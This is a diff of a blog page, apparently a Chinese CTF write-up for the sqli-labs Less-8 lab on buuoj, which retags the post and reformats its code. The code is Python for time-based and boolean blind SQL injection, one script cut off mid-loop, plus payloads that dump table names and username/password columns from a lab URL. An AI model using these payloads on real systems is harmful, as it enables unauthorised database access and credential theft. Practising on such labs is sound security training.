@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E9%A2%98%E7%9B%AE/">
-                                <span class="chip bg-color">web题目</span>
+                            <a href="/tags/sqli/">
+                                <span class="chip bg-color">sqli</span>
                             </a>
                         
                     </div>
@@ -513,15 +513,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def timeOut(url):</span><br><span class="line">   #判断是否延时</span><br><span class="line">    try:</span><br><span class="line">        res=requests.get(url,timeout=3)</span><br><span class="line">        return &quot;No&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;TimeOut&quot;</span><br><span class="line">        </span><br><span class="line">def get_dbName(url):</span><br><span class="line">   #获取数据库名称</span><br><span class="line">    len=0</span><br><span class="line">    while True:</span><br><span class="line">        dbNameLen_url=url+&quot;?id=1&#x27; and if(length(database())=&quot;+str(len)+&quot;,sleep(5),1)--+&quot;</span><br><span class="line">        #print(dbNameLen_url)</span><br><span class="line">        if &quot;TimeOut&quot; in timeOut(dbNameLen_url):</span><br><span class="line">            print(&quot;The Length of dbname :&quot;+str(len))</span><br><span class="line">            break</span><br><span class="line">        elif len&gt;=30:</span><br><span class="line">            print(&quot;ERROR!!!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            len+=1</span><br><span class="line">            </span><br><span class="line">    dbName=&quot;&quot;</span><br><span class="line">    for i in range(1,int(len)+1):</span><br><span class="line">        for a in string.ascii_lowercase:</span><br><span class="line">            dbName_url=url+&quot;?id=1&#x27; and if(substr(database(),&quot;+str(i)+&quot;,1)=&#x27;&quot;+a+&quot;&#x27;,sleep(5),1)--+&quot;</span><br><span class="line">            print()</span><br></pre></td></tr></table></figure>
 
 <p>bool注入 </p>
-<h5 id="同时用到了字典法"><a href="#同时用到了字典法" class="headerlink" title="同时用到了字典法"></a>同时用到了字典法</h5><p>import requests</p>
-<p>dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>flag=””</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#sql数据库不区分大小写，都会打印出来，但flag就一般是小写</span><br></pre></td></tr></table></figure>
+<h5 id="同时用到了字典法"><a href="#同时用到了字典法" class="headerlink" title="同时用到了字典法"></a>同时用到了字典法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">dic=&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">#sql数据库不区分大小写，都会打印出来，但flag就一般是小写</span><br><span class="line">#payload: and substr(database(),1,1)=&#x27;s&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>#payload: and substr(database(),1,1)=’s’</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#爆库payload: and substr(database(),1,1)=&#x27;s&#x27; 注释</span><br><span class="line">#爆表 payload:and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">#limit 0,1是因为有不止一个表，先限制查一个表</span><br><span class="line">#爆字段 substr((select group_concat(username,password) from users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#爆库payload: and substr(database(),1,1)=&#x27;s&#x27; 注释</span><br><span class="line">#爆表 payload:and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">#limit 0,1是因为有不止一个表，先限制查一个表</span><br><span class="line">#爆字段 substr((select group_concat(username,password) from users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+</span><br><span class="line">for i in range(1,8):</span><br><span class="line">    for char in dic:</span><br><span class="line">        url=&quot;http://e38e687d-e37b-4cc8-8fa2-5fa80ff2b5c7.node4.buuoj.cn/Less-8/?id=1&#x27;&quot;</span><br><span class="line">        payload=&quot; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;.format(i,char)</span><br><span class="line">        url = url + payload</span><br><span class="line">        print(url)</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        #print(r.text)</span><br><span class="line">        if &quot;are&quot; in r.text:</span><br><span class="line"></span><br><span class="line">#查看网页源代码里特殊的，要区分大小写，ctrl+f打开网页源代码搜索两种的异处。</span><br><span class="line">            flag+=char</span><br><span class="line">            print(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>for i in range(1,8):<br>    for char in dic:<br>        url=”<a target="_blank" rel="noopener" href="http://e38e687d-e37b-4cc8-8fa2-5fa80ff2b5c7.node4.buuoj.cn/Less-8/?id=1&#39;&quot;">http://e38e687d-e37b-4cc8-8fa2-5fa80ff2b5c7.node4.buuoj.cn/Less-8/?id=1&#39;&quot;</a><br>        payload=” and substr(database(),{},1)=’{}’–+”.format(i,char)<br>        url = url + payload<br>        print(url)<br>        r=requests.get(url)<br>        #print(r.text)<br>        if “are” in r.text:</p>
-<p>#查看网页源代码里特殊的，要区分大小写，ctrl+f打开网页源代码搜索两种的异处。<br>            flag+=char<br>            print(flag)<br>print(flag)</p>
 <hr>
 <p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/2247.html">python</a> </p>
 <p>每一行都是一个语句，当语句以冒号<code>:</code>结尾时，缩进的语句视为代码块。</p>
@@ -625,8 +620,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E9%A2%98%E7%9B%AE/">
-                                    <span class="chip bg-color">web题目</span>
+                                <a href="/tags/sqli/">
+                                    <span class="chip bg-color">sqli</span>
                                 </a>
                             
                         </div>
@@ -832,8 +827,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sqli%E9%9D%B6%E5%9C%BA/">
-                        <span class="chip bg-color">sqli靶场</span>
+                    <a href="/tags/sqli/">
+                        <span class="chip bg-color">sqli</span>
                     </a>
                     
                 </div>
@@ -877,8 +872,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sqli%E9%9D%B6%E5%9C%BA/">
-                        <span class="chip bg-color">sqli靶场</span>
+                    <a href="/tags/sqli/">
+                        <span class="chip bg-color">sqli</span>
                     </a>
                     
                 </div>
@@ -1074,7 +1069,7 @@
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2021</span>
+                <span id="year">2019-2022</span>
             
             <span id="year">2019</span>
             <a href="/about" target="_blank">hzk</a>
